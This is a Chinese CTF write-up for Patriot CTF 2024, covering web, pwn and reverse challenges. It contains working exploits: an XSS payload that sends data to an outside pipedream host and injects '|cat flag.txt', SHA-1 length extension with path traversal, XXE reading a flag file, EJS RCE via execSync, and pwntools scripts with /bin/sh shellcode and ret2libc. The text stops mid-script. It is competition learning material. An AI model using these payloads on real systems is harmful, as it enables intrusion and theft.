# Patriot CTF · 2024 WriteUp

> 原文: https://www.ctfiot.com/206569.html
> ID: 206569

点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：33330字

阅读时长：约80分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

https://pctf.competitivecyber.club

WEB

giraffe notes

X-Forwarded-For: 127.0.0.1

Impersonate

#!/usr/bin/env python3
from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import os
from datetime import datetime, timedelta
import hashlib
app = Flask(__name__)
server_start_time = datetime.now()
server_start_str = "20240921153014"
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)
flag = os.environ.get('FLAG', "flag{this_is_a_fake_flag}")
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
def is_safe_username(username):
    """Check if the username is alphanumeric and less than 20 characters."""
    return username.isalnum() and len(username) < 20
@app.route('/', methods=['GET', 'POST'])
def main():
    """Handle the main page where the user submits their username."""
    if request.method == 'GET':
        uid = uuid.uuid5(secret, "administrator")
        session['username'] = "administrator"
        session['is_admin'] = True
        session['uid'] = str(uid)
        return "1"
@app.route('/user/<uid>')
def user_page(uid):
    """Display the user's session page based on their UUID."""
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    print(session.get('is_admin'))
    print(uuid.uuid5(secret, 'administrator'))
    print(session.get('username') == 'administrator')
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
if __name__ == '__main__':
    app.run("0.0.0.0", port=9999)

secret_key 影响 session 加密结果，跟时间有关，从 /status 获取时间，每十分钟重启一次服务，算一下对应时间。然后本地写好 session 的值，改一下本地用于生成 secretkey 的时间 server_start_str。

Open Seasame

username 是注入点，写 xss 让 adminbot 访问 /api/cal 再把结果带出来

13337 端口

POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
Host: chal.competitivecyber.club:13337
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=.eJwVzMsOQ0AYQOF3sa-4tnQnEzPzT-qSClo7o8IMEQm90PTdy_bk5Psq5XNulbNSL6zlpBKRYJCuoIcCJhiudoXgCN14yxBz1W3qeY5HvkeJvSCxJTc0cUGsr6knIumbgazewepbofQ2gL04SXd0KfKHzgleYNDUZmbJIcMTcehamF0gR6c0XGuwrQghGn_u8ckb1piC2yi_PzGnNSc.Zu9_1A.RyzhVRc9_EAYBfWQPA3GeEmVX0c
Connection: close
Content-Type: application/json
Content-Length: 325

{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal',true);xmlhttp.send();</script>","high_score":999}

后面拼一个命令执行

POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
Host: chal.competitivecyber.club:13337
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=.eJwVzMsOQ0AYQOF3sa-4tnQnEzPzT-qSClo7o8IMEQm90PTdy_bk5Psq5XNulbNSL6zlpBKRYJCuoIcCJhiudoXgCN14yxBz1W3qeY5HvkeJvSCxJTc0cUGsr6knIumbgazewepbofQ2gL04SXd0KfKHzgleYNDUZmbJIcMTcehamF0gR6c0XGuwrQghGn_u8ckb1piC2yi_PzGnNSc.Zu9_1A.RyzhVRc9_EAYBfWQPA3GeEmVX0c
Connection: close
Content-Type: application/json
Content-Length: 348

{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":999}

这里请求发的是 https 的，不能nc监听，用的是 pipedream

Dogdays

Sha-1 加密漏洞：https://log.kv.io/post/2011/03/04/exploiting-sha-1-signed-messages, https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html

exp.py

import struct
import base64
import urllib.parse
import requests

# The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:

top = 0xFFFFFFFF

def rotl(i, n):
    lmask = top << (32 - n)
    rmask = top >> n
    l = i & lmask
    r = i & rmask
    newl = r << n
    newr = l >> (32 - n)
    return newl + newr

def add(l):
    ret = 0
    for e in l:
        ret = (ret + e) & top
    return ret

xrange = range

def sha1_impl(msg, h0, h1, h2, h3, h4):
    for j in xrange(int(len(msg) / 64)):
        chunk = msg[j * 64 : (j + 1) * 64]

        w = {}
        for i in xrange(16):
            word = chunk[i * 4 : (i + 1) * 4]
            (w[i],) = struct.unpack(">i", word)

        for i in range(16, 80):
            w[i] = rotl((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]) & top, 1)

        a = h0
        b = h1
        c = h2
        d = h3
        e = h4

        for i in range(0, 80):
            if 0 <= i <= 19:
                f = (b & c) | ((~b) & d)
                k = 0x5A827999
            elif 20 <= i <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= i <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            elif 60 <= i <= 79:
                f = b ^ c ^ d
                k = 0xCA62C1D6

            temp = add([rotl(a, 5), f, e, k, w[i]])
            e = d
            d = c
            c = rotl(b, 30)
            b = a
            a = temp

        h0 = add([h0, a])
        h1 = add([h1, b])
        h2 = add([h2, c])
        h3 = add([h3, d])
        h4 = add([h4, e])

    return (h0, h1, h2, h3, h4)

def pad(msg, sz=None):
    if sz == None:
        sz = len(msg)
    bits = sz * 8
    padding = 512 - ((bits + 8) % 512) - 64

    msg += b"x80"  # append bit "1", and a few zeros.
    return (
        msg + int(padding / 8) * b"x00" + struct.pack(">q", bits)
    )  # don't count the x80 here, hence the -8.

def sha1(msg):
    # These are the constants in a standard SHA-1
    return sha1_impl(
        pad(msg), 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
    )

# "Local Card Maker"-specific implementation starts here:

def sha1_bytes_to_str(result):
    # return "".join([hex(x)[2:].zfill(2) for x in result])
    return "".join([hex(x)[2:].zfill(8) for x in result])

def get_h_values(hash_string):
    # Divide hash_string to 5 ints, 4 bytes each
    return [int(hash_string[i * 8 : (i + 1) * 8], 16) for i in range(5)]

# "view_profile" taken from site ("page" query parameter)
block_1_buf = b"1.png"
# Hash taken from site ("pHash" query parameter)
# block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_h_values = get_h_values(block_1_hash)
# taken from description of challenge
# salt_len = 12

# "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
# I align to 4 bytes in order for the appended path to be parsed correctly.
block_2_buf = b"/../../../../../../../flag".replace(b"n", b"")
# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
block_2_buf_padded = pad(block_2_buf, len(block_2_buf) + 64)
print(sha1_impl(block_2_buf_padded, *block_1_h_values))
joined_buf_hash = sha1_bytes_to_str(sha1_impl(block_2_buf_padded, *block_1_h_values))
print(joined_buf_hash)
# Add 23 "A"s to simulate the SHA-1 sblock creation with the salt, but remove the salt since it'll be added by the server.
for salt_len in range(12, 13):
    joined_buf = pad((b"A" * salt_len) + block_1_buf)[salt_len:] + block_2_buf

    # print(block_2_buf)
    # print(joined_buf)
    encoded_joined_buf = urllib.parse.quote_plus(joined_buf)
    # print(encoded_joined_buf)

    res = requests.get(
        "http://chal.competitivecyber.club:7777/view.php?pic=%s&hash=%s"
        % (encoded_joined_buf, joined_buf_hash)
    ).content
    if "Invalid".encode() not in res:
        print("length:" + str(salt_len))
        print(block_2_buf)
        print(joined_buf)
        print(encoded_joined_buf)
        print(res)

Flag:

pctf{3xt3nd_my_th4nk5_e9b5f6aa07}

Domdom

python xxe

服务端代码:

const express = require('express');
const app = express();

// Middleware to log each request
app.use((req, res, next) => {
    const now = new Date().toISOString();
    console.log(`${now} - ${req.method} request to ${req.url}`);
    next();  // Pass control to the next handler
});

// Route to return a JSON object
app.get('/get-json', (req, res) => {
    // URL-encoded string
    const encodedComment = "%3c%21%44%4f%43%54%59%50%45%20%64%20%5b%3c%21%45%4e%54%49%54%59%20%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%61%70%70%2f%66%6c%61%67%2e%74%78%74%22%3e%5d%3e%3c%74%3e%26%65%3b%3c%2f%74%3e"
    // Decode the URL-encoded string
    const decodedComment = decodeURIComponent(encodedComment);
    // Construct the JSON object
    const data = {
        "Comment": decodedComment,          // Original encoded string
    };

    // Return the JSON object
    res.json(data);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

客户端请求

POST /check HTTP/1.1
Host: ServerIP:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSrmpxcWJ6alKOkp--QrFqTmpySWpKQppmTmpSrG1OkSpiq0FAErYHiI.Zu8lIw.ZSSS4NVC8C_YhJAAJ-iPCZZFv30
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

url=http://ServerIP:3000/get-json

Flag

PCTF{Y0u_D00m3D_U5_Man_So_SAD}

Blob

ejs rce，请求远程服务器把环境打崩了

?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("touch /tmp/3.txt");&settings[view%20options][client]=true

换了个有回显的 poc

http://chal.competitivecyber.club:3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)

❝

https://blog.z3ratu1.top/hxpCTF2022wp.html

Pwn

Not So Shrimple Is

from pwn import *
io = remote("",)
def exp():
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"AAAAA"+b"x00")
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"AAAA"+b"x00")
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"x82x12x40x00")
    io.recvuntil(b"cool...")

exp()
io.interactive()

Shellcrunch

老套路，调用read重新注入shellcode即可

from pwn import *

io = remote("",)

def xorr(pl):
    length = len(pl)
    list_pl = list(pl)
    for i in range(0,length-1,4):
        list_pl[i] ^= list_pl[i+1]
    
    return bytes(list_pl)
    
def exp():
    shellcode_x64 = b'jhHxb8/bin///sPHx89xe7hrix01x01x814$x01x01x01x011xf6Vjx08^Hx01xe6VHx89xe61xd2j;Xx0fx05'
    pl = b"xEBx04ABCD"
    pl += b"x48x87xF7x48x87xD1"
    pl += b"xEBx04ABCD"
    pl += b"x48x31xFFx6Ax7Ex5A"
    pl += b"xEBx04ABCD"
    pl += b"x0Fx05"
    io.send(xorr(pl))

    io.sendline(b"x90"*len(pl)+shellcode_x64)
    
exp()
io.interactive()

Navigator

有概率通，setpin中可溢出写栈内容，覆盖prev_rbp低字节，修改main中的rbp，这时通过view就有可能将栈上其他内容输出，从而泄露canary和libc，接着同理溢出写返回地址，canary，ret2libc

from pwn import *

io = remote("",)

context.log_level = "debug"
context.arch = "amd64"

def setpin(idx,content):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b">> ",str(idx).encode())
    io.sendlineafter(b">> ",content)

def viewpin():
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b">> ",b"1")

def exp():
    setpin(-48,b"xf0")
    viewpin()
    data = b"".join(io.recvuntil(b"Quit").replace(b"n",b"").split(b" "))
    if b"x7f" not in data:
        exit(0)

    idxx = data.index(b"x7f")
    canary = u64(data[idxx-0x15:idxx-0x15+8])
    libc_base = u64(data[idxx-5:idxx+1]+b"x00x00") - 0x29d90
    pie = u64(data[idxx+11:idxx+17]+b"x00x00") - 0x14f5
    print(hex(libc_base))
    print(hex(pie))
    print(hex(canary))

    libc = ELF("/home/kali/pwnwork/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6")
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rdi_ret = libc_base + 0x000000000002a3e5
    data = flat([rdi_ret+1,rdi_ret,sh_addr,sys_addr])
    cny = p64(canary)
    for i in range(len(cny)):
        setpin(i+0x148,int.to_bytes(cny[i]))

    for i in range(len(data)):
        setpin(i+0x158,int.to_bytes(data[i]))

    io.sendlineafter(b">> ",b"3")
    # viewpin()

exp()
io.interactive()

Flight Script

largebin attack改loglen，溢出ret2libc

from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda tag,data           :io.sendafter(tag, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda tag,data           :io.sendlineafter(tag, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))

io = process("./pwn")
elf = ELF("./pwn")

def toBytes(d):
    return str(d).encode()

def menu(choice):
    sla(b">> ",toBytes(choice))

def add(size,content,c):
    menu(2)
    sla(b">> ",toBytes(size))
    sla(b">> ",content)
    sla(b">> ",c)

def delete(idx):
    menu(4)
    sla(b">> ",toBytes(idx))

def edit(idx,content):
    menu(3)
    sla(b">> ",toBytes(idx))
    sla(b">> ",content)

def overflow(content):
    menu(1)
    sla(b">> ",content)

context.log_level = "debug"
context.arch = "amd64"

def exp():
    loglen = 0x404088
    rdi_ret = 0x00000000004011dc
    add(0x420,b"A",b"y") # 0
    add(0x410,b"B",b"y") # 1
    add(0x410,b"C",b"y") # 2
    delete(0) 
    add(0x500,b"D",b"n") # 0
    delete(2)
    edit(0,p64(loglen-0x20))
    add(0x500,b"E",b"y") # 2
    
    pl = b"A"*0x118 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
    overflow(pl)
    menu(5)
    ru(b"day!n")
    puts = u64(r(6) + b"x00x00")

    libc = ELF("/home/kali/pwnwork/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6")
    libc_base = puts - libc.sym['puts']
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))

    pl = b"A"*0x118 + p64(rdi_ret+1) + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
    overflow(pl)
    menu(5)

exp()
io.interactive()

Strings Only

非栈上fmt

from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda tag,data           :io.sendafter(tag, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda tag,data           :io.sendlineafter(tag, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))

io = process("./pwn")

def toBytes(d):
    return str(d).encode()

def menu(choice):
    sla(b"> ",toBytes(choice))

def add(size):
    menu(1)
    sla(b"> ",toBytes(size))

def show(idx):
    menu(3)
    sla(b"> ",toBytes(idx))

def delete(idx):
    menu(4)
    sla(b"> ",toBytes(idx))

def edit(idx,content):
    menu(2)
    sla(b"> ",toBytes(idx))
    sla(b"> ",content)

context.log_level = "debug"
context.arch = "amd64"

def fmt(idx,content):
    add(0x30)
    edit(idx,content)
    show(idx)

def exp():
    tag = 0xcafebabe
    fmt(0,b"%15$p")
    ru(b"0x")
    key = int(r(12),16) - 0xf0

    fmt(1,f"%{key&0xffff}c%15$hn")
    fmt(2,f"%{tag&0xffff}c%41$hn")
    fmt(3,f"%{(key+2)&0xffff}c%15$hn")
    fmt(4,f"%{(tag>>16)&0xffff}c%41$hn")

    menu(5)

exp()
io.interactive()

sanitizer (OPEN)

mips 32位 小端，可以注入shellcode，但是没搞清楚为啥没做成，好像要先调用sleep?

from pwn import *
context.log_level = "debug"
context.arch = "mips"
io = process(["qemu-mipsel","-L","/usr/mipsel-linux-gnu","-g","8888","./pwn"])
# io = process(["qemu-mipsel","-L","/usr/mipsel-linux-gnu","./pwn"])

# 0x400E60
io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(b"aa")

io.recvuntil(b">> ")
io.sendline(b"2")
io.recvuntil(b">> ")
io.sendline(b"a"*(7*4-1))

io.recvuntil(b"is ")
stack = u32(io.recv(4)) - 0x104
print(hex(stack))

io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(b"."*29+b"a"+p32(stack))

shellcode = b"xffxffx06x28x73x68x0fx3cx62x61xefx35xf8xffxafxafxfcxffxa0xafxf8xffxa4x27xffxffx05x28xabx0fx02x24x0cx01x01x01"
io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(shellcode)

io.recvuntil(b">> ")
io.sendline(b"3")
io.interactive()

Reverse

Revioli, Revioli, give me the formeoli

❝

Can you unlock the secret formula?

你能解开秘密公式吗？

附件拖入ida

读入之后直接做比较判断，下断点动调取值即可

PCTF{ITALY_01123581321345589144233377}

passwordProtector

❝

We’ve been after a notorious skiddie who took the “Is it possible to have a completely secure computer system” question a little too literally. After he found out we were looking for them, they moved to live at the bottom of the ocean in a concrete box to hide from the law. Eventually, they’ll have to come up for air…or get sick of living in their little watergapped world. They sent us this message and executable. Please get their password so we can be ready.

“Mwahahaha you will nOcmu{9gtufever crack into my passMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ympword, i’ll even give you the key and the executable:::: Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV”

附件先用在线网站试着反编译

不能完全反编译，那就用pycdump

然后手动反编译，运算也比较简单

from base64 import b64decode, b64encode
import secrets

# flipFlops = lambda x: chr(ord(x) + 1)

# f=open('topsneaky.txt','rb')
# first=f.read()
# bittys=secrets.token_bytes(len(first))
# onePointFive=int.from_bytes(first)^int.from_bytes(bittys)
# second=onePointFive.to_bytes(len(first))
# third=b64encode(second).decode('utf-8')
# bittysEnc=b64encode(bittys).decode('utf-8')
# fourth=''
# for each in third:
# fourth+=flipFlops(each)
 
# fifth='Mwahahaha you will n'+fourth[0:10]+'ever crack into my pass'+fourth[10:]+"word, i'll even give you the key and the executable:::: "+bittysEnc

fourth='Ocmu{9gtufMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp'
bittysEnc='Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV'

bittys=b64decode(bittysEnc)
fourth=list(fourth.encode('utf-8'))
fourth=[chr(c-1) for c in fourth]
third=b64decode(str(fourth))
one=int.from_bytes(third)^int.from_bytes(bittys)
first=one.to_bytes(len(third))
print(first)
#PCTF{I_<3_$3CUR1TY_THR0UGH_0B5CUR1TY!!}

Puzzle Room

❝

As you delve deeper into the tomb in search of answers, you stumble upon a puzzle room, its floor entirely covered in pressure plates. The warnings of the great necromancer, who hid his treasure here, suggest that one wrong step could lead to your doom.

You enter from the center of the eastern wall. Although you suspect you’re missing a crucial clue to guide your steps, you’re confident that everything you need to safely navigate the traps is already within reach.

At the center of the room lies the key to venturing further into the tomb, along with the promise of powerful treasures to aid you on your quest. Can you find the path, avoid the traps, and claim the treasure (flag) on the central platform?

文本编辑器打开附件

三百多行，看上去需要经过正确的路径从而得到key才能解密出来。仔细观察路径检查函数，发现限制还是挺多的

一共有十种字符串，去掉象征边角那个，还有九种，key就是路径上的字符串拼接得到

起点和终点是确定的。在尝试人工遍历路径走了几条后，就有种强烈的感觉，觉得不会是需要找到最长路径吧。最长路径画个图还是比较容易看出来的，一试，果然

pctf{Did_you_guess_it_or_apply_graph_algorithms?}

VM-ception: Layers of the Lost Byte

❝

You’ve hacked into a mysterious system, only to find yourself inside a virtual machine, within another virtual machine, like stepping into a never-ending hall of mirrors. The first VM interprets the encrypted bytecode, but every instruction gets passed to a deeper layer. As you explore further, each action plunges you deeper into the abyss, where time and logic twist in ways you’ve never imagined.

Will you escape the infinite virtual prison or succumb to its endless loops? The only way out is through… all the layers.

附件拖入ida

挺简单的vm，各个函数名称都保留了，而且实际上只调用了三种指令。脚本

int main() {
 FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\VMception\vm_program.bin", "rb");
 fseek(f, 0, 2);
 fseek(f, 0, 2);
 int len = ftell(f);
 fseek(f, 0, 0);
 char buffer[2048] = { 0 };
 fread(buffer, 1, len, f);

 for (int i = 0; i < len;) {
 i++;
 char tmp = 0;
 for (int j = 0; j < 8; j++) {
 tmp += buffer[i + j];
 }
 printf("%c", tmp);
 i += 8;
 i += 2;
 }

 return 0;
}
//pctf{nest3d_vm_s3cr3ts}

Packed Full Of Surprises

❝

I encrypted a file with a secret flag, but now I can’t seem to figure out how to decrypt it, can you help?

我用秘密标志加密了一个文件，但现在我似乎不知道如何解密，你能帮助吗？

upx直接脱。附件拖入ida

直接上赛博厨子

PCTF{UPX_15_2_3A$y_t0_uNp4cK}

Not another vm reversing problem

❝

You find yourself locked out of a mysterious terminal in an underground lair that’s rumored to hold the key to a treasure of unimaginable value: the flag. The terminal is powered by an ancient, quirky virtual machine that hasn’t been updated since the days of dial-up internet. Your task is simple… on the surface.

This VM is no ordinary one. It’s got an arcane stack-based architecture, four registers that feel like they’ve seen better days, and 16KB of memory that’s probably still running on hopes and dreams. But here’s the twist: the terminal was built by a paranoid genius who coded a secret message—hidden deep within the memory—wrapped in layers of logic more convoluted than the plot of a sci-fi novel.

附件拖入ida

定长指令，长度为4字节，执行的运算也就是一个减法，简单的。脚本

int main() {
 FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\Notanothervmreversingproblem\not_another_vm.prog", "rb");
 fseek(f, 0, 2);
 fseek(f, 0, 2);
 int len = ftell(f);
 fseek(f, 0, 0);
 char buffer[2048] = { 0 };
 fread(buffer, 1, len, f);

 for (int i = 0; i < 30; i++) {
 int tmp = buffer[i * 16];
 int temp = buffer[i * 16 + 4];
 printf("%c", temp - tmp);
 }

 return 0;
}
//pctf{th1s_vm_pr0blem_was_e4sy}

AI? PRNG

❝

I heard those tech cool buzz words use matrices. Well my (very legit) PRNG also uses matricies, can I slap AI/ML/Deep Learning on it too???? Unless???

我听说那些科技术语使用矩阵。我的(非常合法的)PRNG也使用预科，我能把AI/ML/Deep Learning也放进去吗？？？？除非？？？

附件拖入ida

先读入最多32个字节，如果不足的话会重复使用字节补足

然后对每一个位置上的字节进行处理

数字和大小写字母的处理都差不多，都是声明特定的矩阵，然后做乘法，最后求行列式并求余255。其它符号则是简单的乘法再求余

直接手撕开爆。脚本

result=[0xa5,0x39,0x24,0x90,0xa8,0xa5,0x88,0x77,0x26,0xe4,0x3c,0x14,0x03,0x1e,0xba,0x3c,0x7d,0xbb,0xdc,0xd6,0xaa,0x90,0x50,0xc9,0x0f,0xaa,0xdd,0x57,0x33,0xe1,0xa4,0xc7]

def func(s1,s2):
    s3=[0]*4
    for i in range(2):
        for j in range(2):
            s3[2*i+j]=0
            for k in range(2):
                s3[2*i+j]+=s1[2*i+k]*s2[2*k+j]
    return abs(s3[0]*s3[3]-s3[1]*s3[2])

s="0123456789_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in range(len(result)):
    print()
    s1=[48,48,48,i]
    s2=[0xa9,i,48,0xd1]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('0',end=' ')
        #continue
    s1=[49,i,66,i]
    s2=[111,i,49,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('1',end=' ')
        #continue
    s1=[50,50,i,0xaf]
    s2=[18,121,0xfc,50]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('2',end=' ')
        #continue
    s1=[i,0xcd,44,i]
    s2=[51,0x44,0x49,0x37]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('3',end=' ')
        #continue
    s1=[17,0xc9,52,i]
    s2=[0xc9,107,0xc9,52]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('4',end=' ')
        #continue
    s1=[12,i,46,0xda]
    s2=[53,0xea,53,0xb9]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('5',end=' ')
        #continue
    s1=[0xbd,i,25,54]
    s2=[51,i,i,54]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('6',end=' ')
        #continue
    s1=[55,0x85,0xae,80]
    s2=[0x44,0x3c,55,0xc4]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('7',end=' ')
        #continue
    s1=[i,54,i,43]
    s2=[56,0x99,56,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('8',end=' ')
        #continue
    s1=[57,57,57,70]
    s2=[0x9f,i,i,0xd5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('9',end=' ')
        #continue
    s1=[95,0xda,0x8b,i]
    s2=[95,0xc4,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('_',end=' ')
        #continue
    s1=[123,0xe2,i,i]
    s2=[0xa3,123,0xc7,0xa2]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('{',end=' ')
        #continue
    s1=[i,40,0xc4,125]
    s2=[125,30,i,125]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('}',end=' ')
        #continue
    s1=[i,0xe6,i,i]
    s2=[97,97,i,0x93]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('a',end=' ')
        #continue
    s1=[98,i,i,98]
    s2=[0xf2,87,2,87]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('b',end=' ')
        #continue
    s1=[99,i,38,0xc8]
    s2=[i,0x8e,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('c',end=' ')
        #continue
    s1=[116,100,i,100]
    s2=[0xf8,53,0xd9,100]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('d',end=' ')
        #continue
    s1=[101,0x9c,i,16]
    s2=[0x69,0x2c,101,0x98]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('e',end=' ')
        #continue
    s1=[0x97,82,i,0xb3]
    s2=[i,i,21,0xc5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('f',end=' ')
        #continue
    s1=[0xa6,0xe4,i,i]
    s2=[0xf2,0x2b,i,103]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('g',end=' ')
        #continue
    s1=[104,i,0x68,0x53]
    s2=[25,104,0xad,15]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('h',end=' ')
        #continue
    s1=[105,0xa0,109,0xa3]
    s2=[0xc6,0xc9,80,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('i',end=' ')
        #continue
    s1=[0xfb,i,i,i]
    s2=[60,0xe8,106,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('j',end=' ')
        #continue
    s1=[0xc6,75,0x8b,107]
    s2=[0x4b,0x45,107,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('k',end=' ')
        #continue
    s1=[28,0xfa,117,108]
    s2=[0,60,i,108]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('l',end=' ')
        #continue
    s1=[0x9f,i,i,39]
    s2=[7,109,109,109]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('m',end=' ')
        #continue
    s1=[0xd,0x5b,110,i]
    s2=[0x39,0x36,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('n',end=' ')
        #continue
    s1=[i,12,0xbc,75]
    s2=[0xb1,i,0xc2,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('o',end=' ')
        #continue
    s1=[0xc1,0xa1,0xe3,0xe4]
